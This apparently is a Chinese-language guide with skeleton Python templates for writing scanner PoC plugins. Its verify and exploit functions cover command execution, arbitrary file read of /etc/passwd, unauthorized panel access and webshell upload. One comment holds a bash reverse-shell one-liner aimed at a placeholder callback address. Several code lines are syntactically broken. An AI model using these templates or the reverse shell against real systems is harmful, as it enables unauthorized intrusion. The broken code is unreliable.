...
VUL_INFO_DIC = {
    ...
    "vulSolu": "",          # 漏洞的解决方案。
    "PoCType": "0",         # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）3 为木马上传。其余的填写非0即可
...
def verify(address, cookies, proxies):
    ...
    try:  # 增加异常处理，返回None
        ...
        if True: # if 漏洞成立条件
            ...
            VUL_INFO_DIC["Usage"] = ""  # 脚本的使用方法。举例："命令执行漏洞，有回显，可点击利用后直接输入想要查询的命令即可，如whoami"，注意不能有单引号，否则会报错
...
# ------------------验证利用模块-------------------------------------------------------------
# 利用模块模板(选填)，参考场景RCE
def exploit(address, cmd, cookies, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + f"/shell?cmd={cmd}"  # 指定读取的文件
    try: # 增加异常处理，返回具体的异常信息
        #-------如果POC需要认证需要指定cookie，设置代理需要指定proxies
        # requests.get(url, verify=False，cookies=cookies, proxies=proxies)
        #------------------------代码部分-----------------------------------
        ...
        VUL_INFO_DIC["Result"] = "脚本异常，请检查脚本",  # 返回内容信息
        return VUL_INFO_DIC
```
...
def verify(address, cookies, proxies):
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + hostname + "：888/pma"
    try: # 异常处理返回None
        req = requests.get(url, imeout=5, verify=False, proxies=proxies)
        if 200 == req.status_code:
            VUL_INFO_DIC["Payload"] = url
            VUL_INFO_DIC["Usage"] = "未授权访问漏洞，有回显，可直接访问漏洞链接即可验证"，注意不能有单引号，否则会报错
...
def verify(address, cookies, proxies):
    ...
    try:  # 增加异常处理，返回None
        ...
        if req.status_code == 200:   # 存在漏洞条件成立:
            VUL_INFO_DIC["Payload"] = url  # 返回payload信息/URl信息/泄露信息等，酌情选择
            VUL_INFO_DIC["Usage"] = "命令执行漏洞，有回显，可点击利用后，填写查询的命令即可，如whoami" # 按需 也可以这么写  命令执行漏洞，漏洞无回显，可点击利用后，填写查询的命令即可，如/bin/bash -i >& dev/tcp/你的反弹地址/8888 0>&1
            return VUL_INFO_DIC  # 将数据返回
        else:
            return None  # 将数据返回
    except:
...
def exploit(address, cmd, cookie, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    ...
    try:
        req = requests.post(url, verify=False, data=data, proxies=proxies)
        VUL_INFO_DIC["Result"] = req.text,  # 返回内容信息
        VUL_INFO_DIC["debug"] = '任何信息',  # 任何信息   ，该选项为选填
        return VUL_INFO_DIC
    except:
        VUL_INFO_DIC["Result"] = "脚本异常，请检查脚本",  # 返回内容信息
        return VUL_INFO_DIC
...
def verify(address, cookies, proxies):
    ...
    try:
        ...
        req = requests.get(url, verify=False, proxies=proxies)  # Verify为https需要，如果POC需要认证需要指定cookie // requests.get(url, verify=False，cookies=cookies)
        if req.status_code == 200 and "root" in req.text:   # 存在漏洞条件成立:
            VUL_INFO_DIC["Payload"] = url  # 返回payload信息/URl信息/泄露信息等，酌情选择
            VUL_INFO_DIC["Usage"] = "任意文件读取漏洞，有回显，可点击利用后，填写查询的文件即可，如/etc/passwd"
            return VUL_INFO_DIC  # 将数据返回
        else:
            return None # 将数据返回
    except:
...
def exploit(address, cmd,  cookie, proxies):  # cmd代表命令 file文件路径读取
    scheme, netloc, hostname, port, path, query = urlmothod(address)
    url = scheme + "://" + netloc + f"/test?file={cmd}"  # 指定读取的文件
    try:
        req = requests.get(url, verify=False, proxies=proxies)
        VUL_INFO_DIC["Result"] = req.text,  # 返回内容信息
        return VUL_INFO_DIC
    except:
        VUL_INFO_DIC["Result"] = "脚本出现异常，请检查脚本"
        return VUL_INFO_DIC
```


## 木马文件上传 - 举例
木马文件上传检测方式不变，利用方式需要注意将PoCType置为 3 当前3状态下木马上传
...
VUL_INFO_DIC = {
    ...
    "vulType": "IIS_Short_Name",        # 漏洞类型,类型参考见《PoC编写规范》PoC漏洞类型说明。
    "vulSolu": "将目标软件修复至最新版本",  # 漏洞的解决方案。
    "PoCType": "3",                     # 默认为"0"：不包含利用方式，"1"持RCE。 "2"为文件读取（必填）
    "PoCAuth": "0",                     # 0 不需要认证，1 需要认证（必填）
}
...
def verify(address, cookies, proxies):
    ...
    # -----------------------编写POC部分------------------------------
    try:
        url = scheme + "://" + netloc + "/uploadfile"  # 假设目标存在任意文件上传
        data= '<?php echo hello ?>'
        req = requests.post(url, data = data,verify=False, proxies=proxies)  # Verify为https需要，如果POC需要认证需要指定cookie // requests.get(url, verify=False，cookies=cookies)
        if req.status_code == 200 and in req.text:   # 存在漏洞条件成立:
            VUL_INFO_DIC["Payload"] = "木马地址url" # 返回payload信息/URl信息/泄露信息等，酌情选择
            VUL_INFO_DIC["Usage"] = "任意文件上传漏洞，有回显，可点击利用后，填写木马源码"
            return VUL_INFO_DIC  # 将数据返回
        else:
            return None # 将数据返回
    except:
